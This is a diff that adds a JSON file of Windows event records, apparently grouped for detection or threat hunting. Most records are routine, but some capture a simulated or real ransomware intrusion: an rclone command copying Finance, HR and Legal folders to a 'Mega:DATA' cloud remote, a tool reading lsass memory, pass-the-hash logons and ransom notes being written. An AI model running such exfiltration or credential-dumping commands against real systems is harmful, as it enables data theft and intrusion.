@@ -1,0 +1,267 @@
+{
+  "entry_word_shell": [
+    {
+      "@timestamp": "2026-10-25T12:46:42.844Z",
+      "host.name": "dc01",
+      "event.code": "1",
+      "process.name": "cmd.exe",
+      "process.parent.name": "svchost.exe",
+      "process.command_line": "C:\\Windows\\system32\\cmd.exe /d /c C:\\Windows\\system32\\silcollector.cmd configure",
+      "user.name": "SYSTEM"
+    },
+    {
+      "@timestamp": "2026-10-25T12:46:43.014Z",
+      "host.name": "dc01",
+      "event.code": "1",
+      "process.name": "cmd.exe",
+      "process.parent.name": "cmd.exe",
+      "process.command_line": "C:\\Windows\\system32\\cmd.exe /c C:\\Windows\\system32\\reg.exe query hklm\\software\\microsoft\\windows\\softwareinventorylogging /v collectionstate /reg:64",
+      "user.name": "SYSTEM"
+    },
+    {
+      "@timestamp": "2026-10-25T12:55:25.778Z",
+      "host.name": "ws01",
+      "event.code": "1",
+      "process.name": "WINWORD.EXE",
+      "process.parent.name": "svchost.exe",
+      "process.command_line": "\"C:\\Program Files\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /Automation -Embedding",
+      "user.name": "Administrator"
+    },
+    {
+      "@timestamp": "2026-10-25T12:55:43.047Z",
+      "host.name": "ws01",
+      "event.code": "1",
+      "process.name": "WINWORD.EXE",
+      "process.parent.name": "svchost.exe",
+      "process.command_line": "\"C:\\Program Files\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /Automation -Embedding",
+      "user.name": "Administrator"
+    },
+    {
+      "@timestamp": "2026-10-25T13:02:57.401Z",
+      "host.name": "ws01",
+      "event.code": "1",
+      "process.name": "WINWORD.EXE",
+      "process.parent.name": "svchost.exe",
+      "process.command_line": "\"C:\\Program Files\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /Automation -Embedding",
+      "user.name": "Administrator"
+    },
+    {
+      "@timestamp": "2026-10-25T13:03:08.657Z",
+      "host.name": "ws01",
+      "event.code": "1",
+      "process.name": "WINWORD.EXE",
+      "process.parent.name": "svchost.exe",
+      "process.command_line": "\"C:\\Program Files\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /Automation -Embedding",
+      "user.name": "Administrator"
+    }
+  ],
+  "loader_chain": [
+    {
+      "@timestamp": "2026-10-25T12:47:41.939Z",
+      "host.name": "fs01",
+      "event.code": "1",
+      "process.name": "svchost.exe",
+      "process.parent.name": "services.exe",
+      "process.command_line": "C:\\Windows\\system32\\svchost.exe -k LocalService -p",
+      "user.name": "Administrator"
+    },
+    {
+      "@timestamp": "2026-10-25T12:47:47.262Z",
+      "host.name": "fs01",
+      "event.code": "1",
+      "process.name": "svchost.exe",
+      "process.parent.name": "services.exe",
+      "process.command_line": "C:\\Windows\\system32\\svchost.exe -k LocalService -p",
+      "user.name": "Administrator"
+    },
+    {
+      "@timestamp": "2026-10-25T12:47:47.387Z",
+      "host.name": "fs01",
+      "event.code": "1",
+      "process.name": "svchost.exe",
+      "process.parent.name": "services.exe",
+      "process.command_line": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p",
+      "user.name": "SYSTEM"
+    },
+    {
+      "@timestamp": "2026-10-25T12:47:56.042Z",
+      "host.name": "dc01",
+      "event.code": "1",
+      "process.name": "svchost.exe",
+      "process.parent.name": "services.exe",
+      "process.command_line": "C:\\Windows\\system32\\svchost.exe -k wusvcs -p",
+      "user.name": "SYSTEM"
+    },
+    {
+      "@timestamp": "2026-10-25T12:48:53.921Z",
+      "host.name": "ws01",
+      "event.code": "1",
+      "process.name": "svchost.exe",
+      "process.parent.name": "services.exe",
+      "process.command_line": "C:\\Windows\\System32\\svchost.exe -k NetworkService -p",
+      "user.name": "NETWORK SERVICE"
+    },
+    {
+      "@timestamp": "2026-10-25T12:48:54.685Z",
+      "host.name": "ws01",
+      "event.code": "1",
+      "process.name": "svchost.exe",
+      "process.parent.name": "services.exe",
+      "process.command_line": "C:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted -p",
+      "user.name": "LOCAL SERVICE"
+    }
+  ],
+  "remote_thread": [
+    {
+      "@timestamp": "2026-10-25T12:47:01.319Z",
+      "host.name": "fs01",
+      "process.name": "winlogon.exe",
+      "winlog.event_data.TargetImage": "C:\\Windows\\System32\\csrss.exe"
+    },
+    {
+      "@timestamp": "2026-10-25T12:47:49.142Z",
+      "host.name": "fs01",
+      "process.name": "vmtoolsd.exe",
+      "winlog.event_data.TargetImage": "C:\\Windows\\System32\\csrss.exe"
+    },
+    {
+      "@timestamp": "2026-10-25T12:51:56.139Z",
+      "host.name": "fs01",
+      "process.name": "csrss.exe",
+      "winlog.event_data.TargetImage": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"
+    },
+    {
+      "@timestamp": "2026-10-25T12:51:57.585Z",
+      "host.name": "fs01",
+      "process.name": "csrss.exe",
+      "winlog.event_data.TargetImage": "C:\\Windows\\System32\\svchost.exe"
+    },
+    {
+      "@timestamp": "2026-10-25T12:51:57.585Z",
+      "host.name": "fs01",
+      "process.name": "csrss.exe",
+      "winlog.event_data.TargetImage": "C:\\Windows\\System32\\CompatTelRunner.exe"
+    },
+    {
+      "@timestamp": "2026-10-25T12:51:57.585Z",
+      "host.name": "fs01",
+      "process.name": "csrss.exe",
+      "winlog.event_data.TargetImage": "C:\\Windows\\System32\\CompatTelRunner.exe"
+    }
+  ],
+  "lsass_access": [
+    {
+      "@timestamp": "2026-10-25T13:27:28.856Z",
+      "host.name": "fs01",
+      "process.name": "mk.exe",
+      "winlog.event_data.TargetImage": "C:\\Windows\\system32\\lsass.exe",
+      "winlog.event_data.GrantedAccess": "0x1010"
+    },
+    {
+      "@timestamp": "2026-10-25T13:27:47.353Z",
+      "host.name": "ws01",
+      "process.name": "mk.exe",
+      "winlog.event_data.TargetImage": "C:\\Windows\\system32\\lsass.exe",
+      "winlog.event_data.GrantedAccess": "0x1010"
+    },
+    {
+      "@timestamp": "2026-10-25T13:27:47.353Z",
+      "host.name": "ws01",
+      "process.name": "mk.exe",
+      "winlog.event_data.TargetImage": "C:\\Windows\\system32\\lsass.exe",
+      "winlog.event_data.GrantedAccess": "0x1038"
+    }
+  ],
+  "cloud_transfer": [
+    {
+      "@timestamp": "2026-10-25T13:30:34.498Z",
+      "host.name": "fs01",
+      "process.name": "rclone.exe",
+      "process.parent.name": "cmd.exe",
+      "process.command_line": "C:\\Tools\\rclone.exe  --config C:\\Tools\\rclone.conf copy --max-age 2y \"C:\\C0015\\corpus\" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M"
+    },
+    {
+      "@timestamp": "2026-10-25T13:31:46.232Z",
+      "host.name": "fs01",
+      "process.name": "rclone.exe",
+      "process.parent.name": "wsmprovhost.exe",
+      "process.command_line": "\"C:\\Tools\\rclone.exe\" --config C:\\Tools\\rclone.conf size Mega:DATA"
+    }
+  ],
+  "ransom_note": [
+    {
+      "@timestamp": "2026-10-25T13:31:57.478Z",
+      "host.name": "fs01",
+      "process.name": "o4IRWsH4N1a3hjO9Sy2rPP02oyUddH7zA5xGih0ESmlhiiXD9kpWVCPfOwUnayZp_locker.exe",
+      "file.path": "C:\\C0015\\corpus\\readme.txt"
+    },
+    {
+      "@timestamp": "2026-10-25T13:31:57.478Z",
+      "host.name": "fs01",
+      "process.name": "o4IRWsH4N1a3hjO9Sy2rPP02oyUddH7zA5xGih0ESmlhiiXD9kpWVCPfOwUnayZp_locker.exe",
+      "file.path": "C:\\C0015\\corpus\\Finance\\readme.txt"
+    },
+    {
+      "@timestamp": "2026-10-25T13:31:57.478Z",
+      "host.name": "fs01",
+      "process.name": "o4IRWsH4N1a3hjO9Sy2rPP02oyUddH7zA5xGih0ESmlhiiXD9kpWVCPfOwUnayZp_locker.exe",
+      "file.path": "C:\\C0015\\corpus\\HR\\readme.txt"
+    },
+    {
+      "@timestamp": "2026-10-25T13:31:57.486Z",
+      "host.name": "fs01",
+      "process.name": "o4IRWsH4N1a3hjO9Sy2rPP02oyUddH7zA5xGih0ESmlhiiXD9kpWVCPfOwUnayZp_locker.exe",
+      "file.path": "C:\\C0015\\corpus\\IT\\readme.txt"
+    },
+    {
+      "@timestamp": "2026-10-25T13:31:57.486Z",
+      "host.name": "fs01",
+      "process.name": "o4IRWsH4N1a3hjO9Sy2rPP02oyUddH7zA5xGih0ESmlhiiXD9kpWVCPfOwUnayZp_locker.exe",
+      "file.path": "C:\\C0015\\corpus\\Legal\\readme.txt"
+    }
+  ],
+  "pth_logon": [
+    {
+      "@timestamp": "2026-10-25T13:26:59.206Z",
+      "host.name": "fs01",
+      "winlog.event_data.LogonType": "4",
+      "winlog.event_data.TargetUserName": "bk.admin",
+      "winlog.event_data.AuthenticationPackageName": "Negotiate"
+    },
+    {
+      "@timestamp": "2026-10-25T13:26:59.341Z",
+      "host.name": "fs01",
+      "winlog.event_data.LogonType": "4",
+      "winlog.event_data.TargetUserName": "bk.admin",
+      "winlog.event_data.AuthenticationPackageName": "Negotiate"
+    },
+    {
+      "@timestamp": "2026-10-25T13:26:59.359Z",
+      "host.name": "fs01",
+      "winlog.event_data.LogonType": "4",
+      "winlog.event_data.TargetUserName": "bk.admin",
+      "winlog.event_data.AuthenticationPackageName": "Negotiate"
+    },
+    {
+      "@timestamp": "2026-10-25T13:27:47.608Z",
+      "host.name": "fs01",
+      "winlog.event_data.LogonType": "3",
+      "winlog.event_data.TargetUserName": "bk.admin",
+      "winlog.event_data.AuthenticationPackageName": "NTLM"
+    },
+    {
+      "@timestamp": "2026-10-25T13:27:47.629Z",
+      "host.name": "fs01",
+      "winlog.event_data.LogonType": "3",
+      "winlog.event_data.TargetUserName": "bk.admin",
+      "winlog.event_data.AuthenticationPackageName": "NTLM"
+    },
+    {
+      "@timestamp": "2026-10-25T13:27:47.641Z",
+      "host.name": "fs01",
+      "winlog.event_data.LogonType": "3",
+      "winlog.event_data.TargetUserName": "bk.admin",
+      "winlog.event_data.AuthenticationPackageName": "NTLM"
+    }
+  ]
+}
